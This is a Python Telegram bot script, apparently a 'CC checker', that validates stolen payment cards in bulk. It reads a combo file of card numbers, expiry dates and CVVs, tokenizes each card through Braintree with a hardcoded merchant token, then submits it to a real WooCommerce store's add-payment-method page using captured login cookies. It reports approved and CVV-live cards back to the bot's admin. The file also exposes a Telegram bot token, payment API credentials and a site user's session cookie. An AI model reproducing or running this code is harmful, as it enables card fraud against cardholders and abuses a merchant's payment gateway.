import requests
import telebot
from telebot import types
import telebot,os
import time
admin = 6514670561
token="7351251414:AAFSsKpgnQ4dDnXBNjWTOCM9Kh_mn6dFfWA"
bot=telebot.TeleBot(token,parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(message):
	id = message.from_user.id
	if not id == admin:
		bot.reply_to(message,'عذر ليش مشترك في البوت\n @H_D_il / @H_D_il')
	else:
			bot.reply_to(message,"Send the file now \n ارسل الملف الان")
import re,requests
#HAKOU_@H_D_il
#البوابه ليس لي البيع 
def brn(ccx):
	import requests
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
			yy = yy.split("20")[1]
	import requests,re
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTY5NDU2ODAsImp0aSI6ImRhZDJmNzUyLWJiN2YtNDc2OC04ZTUxLTJhMjAyNjNiZTU1ZCIsInN1YiI6ImMzN2JqOTRuNmcyc3hod3EiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImMzN2JqOTRuNmcyc3hod3EiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IlJhZG9uU2VhbF9pbnN0YW50In19.pLAFCoYu09pPQ-QzZuFI1oQtUkp8Admp59FEZg756gqhYuJaGAmuuF8f5gXo_FJC32El1SaFPnMcbwr_ZLQw9Q',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '20beeb03-d556-4fdb-8bb4-2a487c256ece',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': c,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '10090',
	                    'streetAddress': 'new york 45',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	
	cookies = {
	    '_gcl_au': '1.1.635074294.1716858825',
	    '_ga': 'GA1.1.1724606536.1716858825',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-05-28%2001%3A13%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.radonseal.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.radonseal.com%2F',
	    'sbjs_first_add': 'fd%3D2024-05-28%2001%3A13%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.radonseal.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.radonseal.com%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    '_hjSession_3645000': 'eyJpZCI6Ijk0ZDJjYjdmLTRlNzAtNDNmMC1iODllLTAzMTQyNGI3ZDk5MyIsImMiOjE3MTY4NTg4Mjc5NDcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
	    '_clck': '99rwrd%7C2%7Cfm5%7C0%7C1609',
	    '_hjSessionUser_3645000': 'eyJpZCI6Ijc1MjU2NGU1LTUyYzMtNTE2Mi1hNDAyLTc1YmYwZWRlMTEzNiIsImNyZWF0ZWQiOjE3MTY4NTg4Mjc5NDAsImV4aXN0aW5nIjp0cnVlfQ==',
	    'woocommerce_items_in_cart': '1',
	    'woocommerce_cart_hash': 'feea3ab522a83ad05d712dbeaeb0959d',
	    'language': 'en_US',
	    'ledgerCurrency': 'USD',
	    'apay-session-set': 'f%2BBXRjp7hQXeHeO3Lm4Lxx%2FJy2PebPcT2p1BXo7CePdEu3pHjwbY%2FxI7kQHk3xU%3D',
	    'et-editor-available-post-6570-fb': 'fb',
	    '_lscache_vary': 'c7096bfe71727f31ffaf84d7663073e6',
	    'wordpress_logged_in_08db681eb381f4c5057bcdb80e904dd1': 'yasirtraoig.yag%7C1718068573%7C1BsPlAiHsNH9sQvpXM2jh9JN2y1sdpoLihLGbtKHsew%7Ce2d214045ea22d5fb38f278ab0efba7919fda2d8288af1e2aec5c7ddb82f2f06',
	    'wp_woocommerce_session_08db681eb381f4c5057bcdb80e904dd1': '2362%7C%7C1717031714%7C%7C1717028114%7C%7C315ebd954f41f774e92ce4b546eecb6e',
	    'wfwaf-authcookie-961672b01e09c65ef7bb077f43baba5c': '2362%7Cother%7Cread%7C1fcc1a2a4cd729b3cc5c77c4bb889ddb3f5394ffc10a920e3eee54e4b39f8d1c',
	    'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.radonseal.com%2Fmy-account.htm%2Fadd-payment-method',
	    '_ga_G7T93DKNKH': 'GS1.1.1716858825.1.1.1716859151.57.0.0',
	    '_uetsid': '87d7e2401c8f11ef888b3576294f9f5d',
	    '_uetvid': '87d853401c8f11ef9ea1715f31e25ee3',
	    '_clsk': '8p7aav%7C1716859154059%7C13%7C1%7Cr.clarity.ms%2Fcollect',
	}
	
	headers = {
	    'authority': 'www.radonseal.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': '_gcl_au=1.1.635074294.1716858825; _ga=GA1.1.1724606536.1716858825; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-05-28%2001%3A13%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.radonseal.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.radonseal.com%2F; sbjs_first_add=fd%3D2024-05-28%2001%3A13%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.radonseal.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.radonseal.com%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _hjSession_3645000=eyJpZCI6Ijk0ZDJjYjdmLTRlNzAtNDNmMC1iODllLTAzMTQyNGI3ZDk5MyIsImMiOjE3MTY4NTg4Mjc5NDcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _clck=99rwrd%7C2%7Cfm5%7C0%7C1609; _hjSessionUser_3645000=eyJpZCI6Ijc1MjU2NGU1LTUyYzMtNTE2Mi1hNDAyLTc1YmYwZWRlMTEzNiIsImNyZWF0ZWQiOjE3MTY4NTg4Mjc5NDAsImV4aXN0aW5nIjp0cnVlfQ==; woocommerce_items_in_cart=1; woocommerce_cart_hash=feea3ab522a83ad05d712dbeaeb0959d; language=en_US; ledgerCurrency=USD; apay-session-set=f%2BBXRjp7hQXeHeO3Lm4Lxx%2FJy2PebPcT2p1BXo7CePdEu3pHjwbY%2FxI7kQHk3xU%3D; et-editor-available-post-6570-fb=fb; _lscache_vary=c7096bfe71727f31ffaf84d7663073e6; wordpress_logged_in_08db681eb381f4c5057bcdb80e904dd1=yasirtraoig.yag%7C1718068573%7C1BsPlAiHsNH9sQvpXM2jh9JN2y1sdpoLihLGbtKHsew%7Ce2d214045ea22d5fb38f278ab0efba7919fda2d8288af1e2aec5c7ddb82f2f06; wp_woocommerce_session_08db681eb381f4c5057bcdb80e904dd1=2362%7C%7C1717031714%7C%7C1717028114%7C%7C315ebd954f41f774e92ce4b546eecb6e; wfwaf-authcookie-961672b01e09c65ef7bb077f43baba5c=2362%7Cother%7Cread%7C1fcc1a2a4cd729b3cc5c77c4bb889ddb3f5394ffc10a920e3eee54e4b39f8d1c; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.radonseal.com%2Fmy-account.htm%2Fadd-payment-method; _ga_G7T93DKNKH=GS1.1.1716858825.1.1.1716859151.57.0.0; _uetsid=87d7e2401c8f11ef888b3576294f9f5d; _uetvid=87d853401c8f11ef9ea1715f31e25ee3; _clsk=8p7aav%7C1716859154059%7C13%7C1%7Cr.clarity.ms%2Fcollect',
	    'origin': 'https://www.radonseal.com',
	    'referer': 'https://www.radonseal.com/my-account.htm/add-payment-method',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"e376bc34c9e06cc8febf6e97165aeb83","fraud_merchant_id":null,"correlation_id":"e89b6d20b1344eb9f3b497d053d13c7b"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/c37bj94n6g2sxhwq/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/c37bj94n6g2sxhwq"},"merchantId":"c37bj94n6g2sxhwq","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"RadonSeal","clientId":"Ado97DLCUYs7FoxccBIHWenDGL_vbnVLYKkqieoeqiiwXdab2tUP-9DFiM5W-NY7EIMX0xUyZP9O9LJD","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"RadonSeal_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': '2df4c1c6ea',
	    '_wp_http_referer': '/my-account.htm/add-payment-method',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post(
	    'https://www.radonseal.com/my-account.htm/add-payment-method',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		#print(result)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
           # result = "RISK: Retry this BIN later."
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "Please wait for 20 s"
		else:
			result = 'declined'
			#print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return '1000: Approved'
	else:
		return result
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	live = 0
	ch = 0
	last = 0
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
			
				try:
					data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					cn=(data['country']['name'])
				except:
					cn=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					typ=(data['type'])
				except:
					typ=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					url=(data['bank']['url'])
				except:
					#url = ''
					url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					last = str(brn(cc))
				except Exception as e:
					print(e)
				mes = types.InlineKeyboardMarkup(row_width=1)
				yasir = types.InlineKeyboardButton(f"{last}", callback_data='u8')
				cm1 = types.InlineKeyboardButton(f"{cc}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"✅Approved {ch}", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"❎CNN {live}", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"♻️Declined {dd}", callback_data='x')
				stop = types.InlineKeyboardButton(f"STOP", callback_data='u8')
				yasir5 = types.InlineKeyboardButton(f"dev @H_D_il", url= 'https://t.me/H_D_il')
				mes.add(yasir,cm1, cm2, cm3, cm4, yasir5,stop)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''🚹 Checking yor cards...\n by: @H_D_il ''', reply_markup=mes)
				
				
					#	last = "Your card was declined."
				
				msg = f'''𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {cc} 
Gateway -> Braintree Auth
Response ->{last}
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]} - {dicr} - {typ} 
Bank -> {bank} 
Counrty -> {cn} - {emj}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : @@H_D_il '''
				#print(last)
				if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or '1000: Approved' in last:
					key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{msg}</strong>",parse_mode="html",reply_markup=key)
					ch += 1
				elif '2010: Card Issuer Declined CVV' in last or 'avs' in last or 'CVV' in last or 'cvv: Gateway Rejected: cvv' in last or 'Card Issuer Declined CVV' in last:
					live += 1
					key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{msg}</strong>",parse_mode="html",reply_markup=key)
				#	bot.reply_to(message, msg)
				else:
					dd += 1
					time.sleep(20)
	except:
		pass
print("تم تشغيل البوت")
bot.polling()
